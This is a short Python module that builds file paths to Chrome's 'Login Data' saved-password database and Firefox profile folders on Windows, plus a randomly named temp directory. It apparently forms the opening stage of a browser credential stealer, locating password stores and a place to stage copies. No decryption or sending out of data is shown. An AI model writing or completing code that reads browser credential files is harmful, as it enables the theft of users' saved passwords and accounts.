import random
import string
import os

user = os.getlogin()

def get_chrome_path():
    return f"C:/Users/{user}/AppData/Local/Google/Chrome/User Data/Default/Login Data"

def get_firefox_path():
    return f"C:/Users/{user}/AppData/Roaming/Mozilla/Firefox/Profiles"

def create_tmp_path():
    randchars = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    return f"C:/Users/{user}/AppData/Local/Temp/{randchars}" 